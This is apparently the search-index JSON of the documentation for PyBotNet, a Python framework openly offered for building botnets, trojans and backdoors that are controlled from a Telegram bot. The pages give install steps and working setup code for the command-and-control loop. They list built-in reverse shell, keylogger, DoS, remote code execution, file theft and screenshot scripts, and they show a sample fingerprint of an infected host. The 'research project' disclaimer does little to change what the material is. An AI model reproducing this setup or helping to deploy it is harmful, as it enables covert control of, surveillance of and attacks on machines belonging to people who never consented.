{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"PyBotNet A Python framework for building remote control , botnet , trojan or backdoor with Telegram or other control panels Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. Source Code : https://github.com/onionj/pybotnet Documentation : https://onionj.github.io/pybotnet/ Features: \u00b6 Built in Telegram control pannel and proxy Built in scripts like: reverse shell put or get file run python code on target systems get screenshot keylogger dos scheduler ... Cross platform Ability to easily add custom scripts Import external scripts Ability to add custom control panel Add remote control to your apps ... Go to the next page to create the first remote control :)","title":"About"},{"location":"#features","text":"Built in Telegram control pannel and proxy Built in scripts like: reverse shell put or get file run python code on target systems get screenshot keylogger dos scheduler ... Cross platform Ability to easily add custom scripts Import external scripts Ability to add custom control panel Add remote control to your apps ... Go to the next page to create the first remote control :)","title":"Features:"},{"location":"development_and_contributing/","text":"","title":"Development and contributing"},{"location":"help_pybotnet_and_get_help/","text":"","title":"Help pybotnet and get help"},{"location":"release_notes/","text":"","title":"Release notes"},{"location":"tutorial_advanced_guide/create_custom_engine/","text":"comming soon..","title":"Create custom engine"},{"location":"tutorial_advanced_guide/linux_crontab/","text":"comming soon..","title":"Linux crontab"},{"location":"tutorial_advanced_guide/linux_services/","text":"comming soon..","title":"Linux services"},{"location":"tutorial_advanced_guide/windows_startup/","text":"comming soon..","title":"Windows startup"},{"location":"tutorial_user_guide/add_custom_script/","text":"Add custom scripts \u00b6 This functionality is for when you want to add your own script. The simplest PyBotNet custom script looks something like this: main.py from pybotnet import BotNet , Context , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) # new: @botnet . add_script ( script_version = \"0.1.0\" ) # (3) def ping ( context : Context ): # (4) \"\"\"`/ping`\"\"\" # (5) response = f \"pong { ' ' . join ( context . command ) } \" # (6) return response # (7) botnet . run () # (8) Create engine: Engines transfer messages between user and botnet Create BotNet instance Create new custom script received Context, We will talk about Context below PyBotNet use docstrings to create scripts help Get user command from context and join it to \"pong\" , for example, if user sends /ping foo bar the response will be pong foo bar Return response to user Run main loop As you can see, We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel. Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user and etc; We will talk more about Context later Note PyBotNet use docstrings to create scripts help Context is an optional parameter and if you do not include Context in your function, nothing will happen, but you won't have access to the data sent by the user. If you return None , Nothing will be sent back to the user. add_script decorator \u00b6 The program reads the function name and saves it as script name, but you can change the name by setting the script_name variable in the decorator: main.py from pybotnet import BotNet , Context , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) # new: @botnet . add_script ( script_version = \"0.1.0\" , script_name = \"1ping\" ) # (1) def ping ( context : Context ): # (2) \"\"\"`/1ping`\"\"\" return f \"pong { ' ' . join ( context . command ) } \" botnet . run () Change script name from default ( ping ) to 1ping received Context Context \u00b6 Context is a class that can be received in the script input parameter, This includes the following variables and methods: command : List For example in the above code if the user sends /1ping foo bar , context.command will return this list: [\"foo\", \"bar\"] time_stamp : str context creation time system_info : callable In scripts, sometimes we need target information, such as IP or MAC address, etc; We can get them with this method. for example context.system_info() returns this data: scripts_name mac_addres os global_ip bot_name local_ip host_name system_user up_time current_route pid cpu_count pybotnet_version This method has a flag that if we use it, less data will be returned: context.system_info(minimal=True) return just minimal data: scripts_name mac_addres os global_ip bot_name system_info method cache data for 30s engine : This variable returns the active engine, (Engines transfer messages between user and botnet, for example we used build in TelegramEngine in the above code, You can create custom engines. We will talk about it in the advanced part of the document) engines have send() , receive() and send_file() methods; You can use them to communicate with the user. send method takes two parameter, a string (required) and dict (optional) for adding it to the submessagse You can send context.system_info(minimal=True) to the second parameter send_file like send method takes two parametr, first parametr gets the route of the file (required), and the second takes a dict (optional) for add it to sub of message.. recive return not procesed user command as a list of string, and if not found new user command, return False Engines PyBotNet currently has three engines: BaseEngine : abstract Engine TestEngine TelegramEngine meta_data : dict this variable contains current script_name , script_version and script_doc global values: Sometimes we need to set a variable that can be accessed from anywhere in the program; You can use these two methods to do this: set_global_value : callable With this method you can save data in temp memory get_global_value : callable Takes a key and returns the data For example, if we want to store a variable in script A and use it in script B: in script A we set value: set_global_value(\"message_from_A\", \"hi\") and in script B we get value: get_global_value(\"message_from_A\") UserException \u00b6 If input data from user (PyBotNet gets it from context.command or in script call context.engine.recive() ) was not valid, PyBotNet will raise an UserException say: raise UserException(\"the reason\") PyBotNet simple_serializer to validate user input data, this function checks len, type of the data and if is ok return a list of converted command by new types.. main.py from pybotnet import BotNet , Context , TelegramEngine , simple_serializer # (1) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) @botnet . add_script () def echo ( context : Context ): \"\"\"`/echo <number> <word>`\"\"\" command , err = simple_serializer ( context . command , [ int , str ]) # (2) if err : raise UserException ( err ) # (3) # (4) number = command [ 0 ] word = command [ 1 ] for _ in range ( number ): print ( word ) # (5) botnet . run () Import simple_serializer from pybotnet sends user command with excepted types to simple_serializer Send error details to user This is the data returned from simple_serializer, and it has new data types. This script dosen't return anything, (by default python returns None ) so it won't send back any responses to the user","title":"Add custom script"},{"location":"tutorial_user_guide/add_custom_script/#add-custom-scripts","text":"This functionality is for when you want to add your own script. The simplest PyBotNet custom script looks something like this: main.py from pybotnet import BotNet , Context , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) # new: @botnet . add_script ( script_version = \"0.1.0\" ) # (3) def ping ( context : Context ): # (4) \"\"\"`/ping`\"\"\" # (5) response = f \"pong { ' ' . join ( context . command ) } \" # (6) return response # (7) botnet . run () # (8) Create engine: Engines transfer messages between user and botnet Create BotNet instance Create new custom script received Context, We will talk about Context below PyBotNet use docstrings to create scripts help Get user command from context and join it to \"pong\" , for example, if user sends /ping foo bar the response will be pong foo bar Return response to user Run main loop As you can see, We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel. Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user and etc; We will talk more about Context later Note PyBotNet use docstrings to create scripts help Context is an optional parameter and if you do not include Context in your function, nothing will happen, but you won't have access to the data sent by the user. If you return None , Nothing will be sent back to the user.","title":"Add custom scripts"},{"location":"tutorial_user_guide/add_custom_script/#add_script-decorator","text":"The program reads the function name and saves it as script name, but you can change the name by setting the script_name variable in the decorator: main.py from pybotnet import BotNet , Context , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) # new: @botnet . add_script ( script_version = \"0.1.0\" , script_name = \"1ping\" ) # (1) def ping ( context : Context ): # (2) \"\"\"`/1ping`\"\"\" return f \"pong { ' ' . join ( context . command ) } \" botnet . run () Change script name from default ( ping ) to 1ping received Context","title":"add_script decorator"},{"location":"tutorial_user_guide/add_custom_script/#context","text":"Context is a class that can be received in the script input parameter, This includes the following variables and methods: command : List For example in the above code if the user sends /1ping foo bar , context.command will return this list: [\"foo\", \"bar\"] time_stamp : str context creation time system_info : callable In scripts, sometimes we need target information, such as IP or MAC address, etc; We can get them with this method. for example context.system_info() returns this data: scripts_name mac_addres os global_ip bot_name local_ip host_name system_user up_time current_route pid cpu_count pybotnet_version This method has a flag that if we use it, less data will be returned: context.system_info(minimal=True) return just minimal data: scripts_name mac_addres os global_ip bot_name system_info method cache data for 30s engine : This variable returns the active engine, (Engines transfer messages between user and botnet, for example we used build in TelegramEngine in the above code, You can create custom engines. We will talk about it in the advanced part of the document) engines have send() , receive() and send_file() methods; You can use them to communicate with the user. send method takes two parameter, a string (required) and dict (optional) for adding it to the submessagse You can send context.system_info(minimal=True) to the second parameter send_file like send method takes two parametr, first parametr gets the route of the file (required), and the second takes a dict (optional) for add it to sub of message.. recive return not procesed user command as a list of string, and if not found new user command, return False Engines PyBotNet currently has three engines: BaseEngine : abstract Engine TestEngine TelegramEngine meta_data : dict this variable contains current script_name , script_version and script_doc global values: Sometimes we need to set a variable that can be accessed from anywhere in the program; You can use these two methods to do this: set_global_value : callable With this method you can save data in temp memory get_global_value : callable Takes a key and returns the data For example, if we want to store a variable in script A and use it in script B: in script A we set value: set_global_value(\"message_from_A\", \"hi\") and in script B we get value: get_global_value(\"message_from_A\")","title":"Context"},{"location":"tutorial_user_guide/add_custom_script/#userexception","text":"If input data from user (PyBotNet gets it from context.command or in script call context.engine.recive() ) was not valid, PyBotNet will raise an UserException say: raise UserException(\"the reason\") PyBotNet simple_serializer to validate user input data, this function checks len, type of the data and if is ok return a list of converted command by new types.. main.py from pybotnet import BotNet , Context , TelegramEngine , simple_serializer # (1) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) @botnet . add_script () def echo ( context : Context ): \"\"\"`/echo <number> <word>`\"\"\" command , err = simple_serializer ( context . command , [ int , str ]) # (2) if err : raise UserException ( err ) # (3) # (4) number = command [ 0 ] word = command [ 1 ] for _ in range ( number ): print ( word ) # (5) botnet . run () Import simple_serializer from pybotnet sends user command with excepted types to simple_serializer Send error details to user This is the data returned from simple_serializer, and it has new data types. This script dosen't return anything, (by default python returns None ) so it won't send back any responses to the user","title":"UserException"},{"location":"tutorial_user_guide/config_BotNet_class/","text":"you can change some config from BotNet class Example: main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine , # (1) bot_name = \"onion!\" , # (2) delay = 1.5 , # (3) use_default_scripts = True , # (4) start_end_notify = True , # (5) debug = False # (6) ) botnet . run () Positional parameter engine Custom name for this instance sleep in main_loop use build in scripts, default is True Send a message to the user when the program is running or stopped, default is True show logs by log level debug !, default is False","title":"config BotNet class"},{"location":"tutorial_user_guide/external_scripts/","text":"You can write a series of scripts outside the main file and add it to your botnet by importing ExternalScripts For example: external_scripts.py from pybotnet import ExternalScripts , Context # (1) external_botnet = ExternalScripts () # (2) @external_botnet . add_script () # (3) def hello_world (): \"\"\"return hello_world\"\"\" return \"hello_world\" @external_botnet . add_script ( script_name = 'sys_data' , script_version = \"0.1.0\" ) # (4) def get_system_info ( context : Context ): \"\"\"return system_info\"\"\" sys_data = \"\" for key , value in context . system_info () . items (): sys_data += f \" { key } : { value } \\n \" return sys_data import ExternalScripts from pybotnet Create ExternalScripts instance Add some simple script Create other script.. In the above code we created an instance of ExternalScripts (this is a botNet child) and added our scripts.. main.py from pybotnet import BotNet , TelegramEngine from external_scripts import external_botnet # (1) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) botnet . import_external_scripts ( external_botnet ) # (2) botnet . run () # (3) Import external_botnet from external_scripts.py add external scripts to our botnet instance or you can use botnet.run_background(), botnet.stop_background() import external_botnet from external_script.py and add external scripts to botnet by call botnet.import_external_scripts(external_botnet)","title":"External scripts"},{"location":"tutorial_user_guide/run_in_background/","text":"botnet in background, Example: main.py import time from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) botnet . run_background () # (1) time . sleep ( 10 ) # (2) botnet . stop_background () # (3) run botnet in background just wait for 10s stop botnet in above example we run botnet in backgrund, wait for 10s and stop it!","title":"Run in background"},{"location":"tutorial_user_guide/running_pybotnet_without_coding/","text":"We have seen before that we need some code to run pybotnet, but it is possible to run pybotnet as a module All you have to do is, install PyBotNet on your system and enter the following command in your terminal: \u200d\u200d pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version. python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME] somthing like: python3 -m pybotnet -t 5526760482:AAGweoNtLrHEsasxnklwhjms78ytPS3U8gEO6asc -i 5590231667 -n test Note TELEGRAM_TOKEN : You can use telegram @botfather to Create new telegram API Bot and get youre TELEGRAM_TOKEN ADMIN_CHAT_ID : Get it from @userinfobot telegram bot PyBotNet include default scripts, like: /shell , /put_file , /get_file , /screenshot , /who , ..., you can send /help to your telegram bot and see more detail..","title":"Running pybotnet without coding"},{"location":"tutorial_user_guide/simple_usage/","text":"Install PyBotNet \u00b6 pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version. The simplest PyBotNet file could look like this: \u00b6 main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : You can use telegram @botfather to Create new telegram API Bot and get youre TELEGRAM_TOKEN ADMIN_CHAT_ID : Get it from @userinfobot telegram bot PyBotNet include default scripts, like: /shell , /put_file , /get_file , /screenshot , /who , ..., you can send /help to your telegram bot and see more detail.. Run code: \u00b6 python3 main.py telegram engine \u00b6 open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about specific script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one specific system for run script on all client send /screenshot . bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot in some case like /shell you need to run it just for one system.","title":"Simple usage"},{"location":"tutorial_user_guide/simple_usage/#install-pybotnet","text":"pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version.","title":"Install PyBotNet"},{"location":"tutorial_user_guide/simple_usage/#the-simplest-pybotnet-file-could-look-like-this","text":"main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : You can use telegram @botfather to Create new telegram API Bot and get youre TELEGRAM_TOKEN ADMIN_CHAT_ID : Get it from @userinfobot telegram bot PyBotNet include default scripts, like: /shell , /put_file , /get_file , /screenshot , /who , ..., you can send /help to your telegram bot and see more detail..","title":"The simplest PyBotNet file could look like this:"},{"location":"tutorial_user_guide/simple_usage/#run-code","text":"python3 main.py","title":"Run code:"},{"location":"tutorial_user_guide/simple_usage/#telegram-engine","text":"open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about specific script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one specific system for run script on all client send /screenshot . bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot in some case like /shell you need to run it just for one system.","title":"telegram engine"}]}